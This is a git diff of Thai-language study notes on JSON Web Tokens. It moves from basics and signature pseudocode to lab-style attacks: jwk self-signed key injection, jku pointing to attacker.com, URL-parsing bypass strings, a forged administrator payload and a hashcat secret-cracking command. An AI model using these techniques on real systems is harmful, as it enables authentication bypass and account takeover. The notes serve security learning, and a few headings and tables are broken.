@@ -1,10 +1,109 @@
 
+JWT (JSON Web Token) เป็น standard สำหรับการส่งผ่านข้อมูลระหว่าง parties อย่างปลอดภัย โดยหลักๆ แล้ว JWT ช่วยแก้ปัญหาเหล่านี้:
+
+## Pain Points ที่ JWT แก้ได้
+
+**1. Session Management ที่ซับซ้อน**
+- แทนที่จะเก็บ session ไว้ใน server (stateful) JWT ทำให้ระบบเป็น stateless
+- ไม่ต้องกังวลเรื่อง session storage, cleanup หรือ scaling issues
+
+**2. การ Authentication ข้าม Services**
+- ใน microservices architecture สามารถใช้ JWT เดียวกันยืนยันตัวตนได้หลาย services
+- ไม่ต้องเรียก authentication service ทุกครั้ง
+
+**3. Cross-Domain Authentication**
+- เหมาะสำหรับ Single Page Applications (SPA) และ mobile apps
+- ส่งผ่าน HTTP headers ได้ง่าย ไม่ติด cookie domain restrictions
+
+**4. Scalability**
+- เนื่องจากเป็น self-contained token ไม่ต้องพึ่งพา central database
+- Load balancer สามารถส่งไปยัง server ไหนก็ได้
+
+**5. Mobile-Friendly**
+- Mobile apps ทำงานกับ JWT ได้ง่ายกว่า cookie-based sessions
+- เก็บใน local storage หรือ secure storage ได้
+
+
+
+## การทำงานของ Signature ใน JWT
+
+### Signature คืออะไร?
+Signature เปรียบเหมือน **"ตราประทับดิจิทัล"** ที่รับประกันว่า JWT นี้:
+1. **มาจาก server จริง** (Authentication)
+2. **ไม่ถูกแก้ไข** (Integrity)
+
+### กระบวนการสร้าง Signature
+
+```javascript
+// 1. เตรียม Header และ Payload
+header = {
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+payload = {
+  "user_id": 12345,
+  "username": "somchai",
+  "role": "user",
+  "exp": 1640995200
+}
+
+// 2. Encode เป็น Base64URL
+encodedHeader = base64url(header)    // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+encodedPayload = base64url(payload)  // eyJ1c2VyX2lkIjoxMjM0NSwidXNlcm5hbWUiOiJzb21jaGFpIn0
+
+// 3. รวมกันด้วย dot
+message = encodedHeader + "." + encodedPayload
+
+// 4. สร้าง Signature ด้วย secret key
+signature = HMACSHA256(message, "your-256-bit-secret")
+
+// 5. JWT สุดท้าย
+jwt = encodedHeader + "." + encodedPayload + "." + signature
+```
+
+
+### การตรวจสอบ Signature
+
+```javascript
+// เมื่อ server ได้รับ JWT
+function verifyJWT(token) {
+  // 1. แยก JWT ออกเป็น 3 ส่วน
+  const [header, payload, signature] = token.split('.')
+  
+  // 2. สร้าง signature ใหม่จาก header + payload
+  const expectedSignature = HMACSHA256(
+    header + "." + payload, 
+    "your-256-bit-secret"
+  )
+  
+  // 3. เปรียบเทียบ signature
+  if (signature === expectedSignature) {
+    return "✅ Valid JWT"
+  } else {
+    return "❌ Invalid JWT"
+  }
+}
+```
+
+### Algorithm ต่างๆ
+
+**1. HMAC (Symmetric)**
+- HS256, HS384, HS512
+- ใช้ secret key เดียวกันทั้งสร้างและตรวจสอบ
+- เร็ว เหมาะกับ internal services
+
+**2. RSA (Asymmetric)**  
+- RS256, RS384, RS512
+- Private key สร้าง signature
+- Public key ตรวจสอบ signature
+- ปลอดภัยกว่า เหมาะกับ public APIs
+
+
+
+
 ![alt text](image-7.png)
-### JWT คืออะไร?
 
-JSON Web Token (JWT) เป็นรูปแบบมาตรฐานสำหรับส่งข้อมูล JSON ที่มีลายเซ็นเข้ารหัสระหว่างระบบ โดยทฤษฎีแล้วสามารถบรรจุข้อมูลประเภทใดก็ได้ แต่มักใช้ส่งข้อมูล ("claims") เกี่ยวกับผู้ใช้เป็นส่วนหนึ่งของกลไกการตรวจสอบตัวตน การจัดการเซสชัน และการควบคุมการเข้าถึง
-
-ต่างจาก session token แบบคลาสสิก ข้อมูลทั้งหมดที่เซิร์ฟเวอร์ต้องการจะถูกเก็บไว้ฝั่งไคลเอนต์ภายใน JWT เอง ทำให้ JWT เป็นตัวเลือกยอดนิยมสำหรับเว็บไซต์ที่กระจายอย่างมากที่ผู้ใช้ต้องโต้ตอบกับเซิร์ฟเวอร์แบ็กเอนด์หลายตัวอย่างราบรื่น
 
 ### รูปแบบ JWT
 
@@ -31,14 +130,6 @@ eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9
 ในกรณีส่วนใหญ่ ข้อมูลนี้สามารถอ่านหรือแก้ไขได้ง่ายโดยใครก็ตามที่เข้าถึงโทเค็นได้ ดังนั้น ความปลอดภัยของกลไกใดๆ ที่ใช้ JWT จึงพึ่งพาลายเซ็นเข้ารหัสเป็นหลัก
 
 
-
-### ลายเซ็น JWT
-
-เซิร์ฟเวอร์ที่ออกโทเค็นมักจะสร้างลายเซ็นโดยการแฮช header และ payload ในบางกรณี พวกเขายังเข้ารหัสแฮชที่ได้ด้วย ไม่ว่าจะด้วยวิธีใด กระบวนการนี้เกี่ยวข้องกับ secret signing key กลไกนี้ให้วิธีสำหรับเซิร์ฟเวอร์ในการตรวจสอบว่าไม่มีข้อมูลใดภายในโทเค็นถูกแปลงแปลงตั้งแต่ออกมา:
-
-- เนื่องจากลายเซ็นได้มาโดยตรงจากส่วนอื่นของโทเค็น การเปลี่ยนแปลงไบต์เดียวของ header หรือ payload จะส่งผลให้ลายเซ็นไม่ตรงกัน
-
-- หากไม่รู้ secret signing key ของเซิร์ฟเวอร์ จะไม่สามารถสร้างลายเซ็นที่ถูกต้องสำหรับ header หรือ payload ที่กำหนดได้
 
 ## JWT vs JWS vs JWE## สรุปสำคัญ 🎯
 
@@ -241,4 +332,243 @@ hashcat -a 0 -m 16500 <jwt> <wordlist> --show
 ![alt text](image-11.png)
 
 
+
+## การฉีด JWT Header Parameter
+
+ตามข้อกำหนด JWS มีเพียงพารามิเตอร์ header `alg` เท่านั้นที่บังคับ อย่างไรก็ตาม ในทางปฏิบัติ JWT header (หรือที่เรียกว่า JOSE header) มักประกอบด้วยพารามิเตอร์อื่นๆ หลายตัว สิ่งต่อไปนี้มีความสำคัญเป็นพิเศษสำหรับผู้โจมตี:
+
+- **jwk (JSON Web Key)** - ให้ออบเจ็กต์ JSON ฝังตัวที่แสดงถึง key
+- **jku (JSON Web Key Set URL)** - ให้ URL ที่เซิร์ฟเวอร์สามารถดึงชุดของ key ที่ประกอบด้วย key ที่ถูกต้อง
+- **kid (Key ID)** - ให้ ID ที่เซิร์ฟเวอร์สามารถใช้ระบุ key ที่ถูกต้องในกรณีที่มี key หลายตัวให้เลือก ขึ้นอยู่กับรูปแบบของ key อาจมีพารามิเตอร์ kid ที่ตรงกัน
+
+อย่างที่คุณเห็น พารามิเตอร์ที่ผู้ใช้ควบคุมได้เหล่านี้แต่ละตัวจะบอกเซิร์ฟเวอร์ผู้รับว่าจะใช้ key ใดในการตรวจสอบลายเซ็น ในส่วนนี้ คุณจะได้เรียนรู้วิธีการใช้ประโยชน์จากสิ่งเหล่านี้เพื่อฉีด JWT ที่แก้ไขแล้วซึ่งเซ็นโดยใช้ key ตามอำเภอใจของคุณเองแทนที่จะเป็น secret ของเซิร์ฟเวอร์
+
+### การฉีด Self-signed JWT ผ่านพารามิเตอร์ jwk
+
+ข้อกำหนด JSON Web Signature (JWS) อธิบายพารามิเตอร์ header `jwk` ที่เป็นทางเลือก ซึ่งเซิร์ฟเวอร์สามารถใช้เพื่อฝัง public key ของพวกเขาโดยตรงภายในโทเค็นเองในรูปแบบ JWK
+
+**JWK**
+JWK (JSON Web Key) เป็นรูปแบบมาตรฐานสำหรับการแสดง key เป็นออบเจ็กต์ JSON
+
+คุณสามารถเห็นตัวอย่างในส่วน JWT header ต่อไปนี้:
+
+```json
+{
+    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "e": "AQAB",
+        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
+    }
+}
+```
+
+**Public และ Private Key**
+
+ตามหลักแล้ว เซิร์ฟเวอร์ควรใช้เฉพาะ whitelist ที่จำกัดของ public key เพื่อตรวจสอบลายเซ็น JWT อย่างไรก็ตาม เซิร์ฟเวอร์ที่กำหนดค่าผิดบางครั้งจะใช้ key ใดก็ได้ที่ฝังอยู่ในพารามิเตอร์ `jwk`
+
+คุณสามารถใช้ประโยชน์จากพฤติกรรมนี้โดยการเซ็น JWT ที่แก้ไขแล้วโดยใช้ RSA private key ของคุณเอง จากนั้นฝัง public key ที่ตรงกันใน jwk header
+
+แม้ว่าคุณสามารถเพิ่มหรือแก้ไขพารามิเตอร์ `jwk` ใน Burp ด้วยตนเองได้ แต่ JWT Editor extension ให้คุณสมบัติที่มีประโยชน์เพื่อช่วยคุณทดสอบช่องโหว่นี้:
+
+1. เมื่อโหลด extension แล้ว ในแถบแท็บหลักของ Burp ไปที่แท็บ JWT Editor Keys
+2. สร้าง RSA key ใหม่
+3. ส่ง request ที่ประกอบด้วย JWT ไปยัง Burp Repeater
+4. ใน message editor เปลี่ยนไปที่แท็บ JSON Web Token ที่ extension สร้างขึ้น และแก้ไข payload ของโทเค็นตามที่คุณต้องการ
+5. คลิก Attack จากนั้นเลือก Embedded JWK เมื่อได้รับการแจ้ง ให้เลือก RSA key ที่คุณเพิ่งสร้างขึ้น
+6. ส่ง request เพื่อทดสอบว่าเซิร์ฟเวอร์ตอบสนองอย่างไร
+
+คุณยังสามารถทำการโจมตีนี้ด้วยตนเองโดยการเพิ่ม jwk header เอง อย่างไรก็ตาม คุณอาจต้องอัปเดตพารามิเตอร์ header `kid` ของ JWT ให้ตรงกับ kid ของ key ที่ฝังไว้ด้วย การโจมตีในตัวของ extension จะดูแลขั้นตอนนี้ให้คุณ
+
+![alt text](image-13.png)
+
+-server supports the jwk parameter in the JWT header. 
+
+-sometimes used to embed the correct verification key directly in the token. 
+
+-fails to check whether the provided key came from a trusted source.
+
+![alt text](image-14.png)
+
+![alt text](image-15.png)
+
+
+
+### สิ่งที่เกิดขึ้นจริง:
+1. **เซิร์ฟเวอร์ตรวจสอบ signature** ✅
+2. **แต่ใช้ public key ผิดตัว** ❌ (ใช้ public key จาก jwk header แทนที่จะเป็น public key ของเซิร์ฟเวอร์)
+
+### กระบวนการโจมตี:
+```
+1. ผู้โจมตีสร้าง RSA key pair ของตนเอง
+   - Private key: สำหรับเซ็น JWT
+   - Public key: ใส่ใน jwk header
+
+2. เซ็น JWT ด้วย private key ของผู้โจมตี
+   ✅ signature ถูกต้อง (สำหรับ key ของผู้โจมตี)
+
+3. ส่ง JWT ไปยังเซิร์ฟเวอร์
+
+4. เซิร์ฟเวอร์ตรวจสอบ signature โดยใช้ public key จาก jwk header
+   ✅ signature ผ่าน! (เพราะใช้ public key ที่ตรงกับ private key ที่เซ็น)
+```
+
+### ปัญหาคือ:
+- **เซิร์ฟเวอร์ตรวจสอบ signature** ✅
+- **แต่ใช้ public key ของผู้โจมตี** ❌ แทนที่จะเป็น public key ของเซิร์ฟเวอร์
+
+
+# JWT jku (JWK Set URL) Parameter
+
+## jku คืออะไร?
+
+**jku (JSON Web Key Set URL)** คือพารามิเตอร์ใน JWT header ที่ให้ URL ที่เซิร์ฟเวอร์สามารถดาวน์โหลด JWK Set (ชุดของ public keys) เพื่อใช้ในการตรวจสอบลายเซ็น JWT
+
+## JWK Set คืออะไร?
+
+JWK Set เป็น JSON object ที่ประกอบด้วย array ของ JWKs แทนที่จะฝัง key ตัวเดียวใน JWT header:
+
+```json
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB", 
+            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
+            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y..."
+        },
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA", 
+            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67..."
+        }
+    ]
+}
+```
+
+## วิธีการทำงานของ jku
+
+### 1. JWT Header ที่มี jku
+```json
+{
+    "alg": "RS256",
+    "typ": "JWT", 
+    "jku": "https://example.com/.well-known/jwks.json",
+    "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab"
+}
+```
+
+### 2. ขั้นตอนการตรวจสอบ
+1. **เซิร์ฟเวอร์อ่าน jku URL** จาก JWT header
+2. **ดาวน์โหลด JWK Set** จาก URL นั้น
+3. **หา key ที่ตรงกับ kid** ใน JWK Set 
+4. **ใช้ key นั้นตรวจสอบลายเซ็น** JWT
+
+### 3. ตัวอย่างขั้นตอน
+
+```
+JWT Header: {"alg":"RS256","jku":"https://trusted.com/keys","kid":"key1"}
+                     ↓
+Server fetches: https://trusted.com/keys  
+                     ↓
+Gets JWK Set: {"keys":[{"kid":"key1","kty":"RSA",...}]}
+                     ↓
+Uses key with kid="key1" to verify signature
+```
+
+## ช่องโหว่ของ jku
+
+### 1. ไม่ตรวจสอบ URL ที่เชื่อถือได้
+หาก server ไม่มี whitelist ของ trusted domains:
+
+```json
+{
+    "alg": "RS256", 
+    "jku": "https://attacker.com/malicious-keys",
+    "kid": "malicious-key"
+}
+```
+
+### 2. URL Parsing Bypass
+ใช้เทคนิค URL parsing เพื่อหลีกเลี่ยง domain filtering:
+
+```
+https://trusted.com.attacker.com/keys
+https://trusted.com@attacker.com/keys  
+https://trusted.com#@attacker.com/keys
+```
+
+### 3. การโจมตีขั้นตอน
+
+**Step 1:** สร้าง malicious JWK Set
+```json
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "kid": "attacker-key",
+            "e": "AQAB",
+            "n": "your-public-key-here..."
+        }
+    ]
+}
+```
+
+**Step 2:** Host JWK Set บนเซิร์ฟเวอร์ของผู้โจมตี
+```
+https://attacker.com/malicious-keys
+```
+
+**Step 3:** สร้าง JWT ที่ชี้ไป malicious URL
+```json
+{
+    "alg": "RS256",
+    "jku": "https://attacker.com/malicious-keys", 
+    "kid": "attacker-key"
+}
+```
+
+**Step 4:** เซ็น JWT ด้วย private key ที่ตรงกัน
+
+## ตัวอย่างการโจมตี jku ใน Burp Suite
+
+### 1. Setup
+- สร้าง RSA key pair ใน JWT Editor
+- Host malicious JWK Set บน server ของคุณ
+
+### 2. สร้าง Malicious JWT
+```json
+{
+    "alg": "RS256",
+    "typ": "JWT",
+    "jku": "https://your-server.com/malicious-keys",
+    "kid": "your-key-id"
+}
+```
+
+### 3. Payload
+```json
+{
+    "sub": "administrator",
+    "iat": 1516239022,
+    "exp": 1648037164
+}
+```
+
+
+| Aspect | jwk | jku |
+|--------|-----|-----|
+| **Location** | ฝังใน JWT header | External URL |
+
+
+
+![alt text](image-18.png)
+
+![alt text](image-16.png)
+
+![alt text](image-17.png)
 
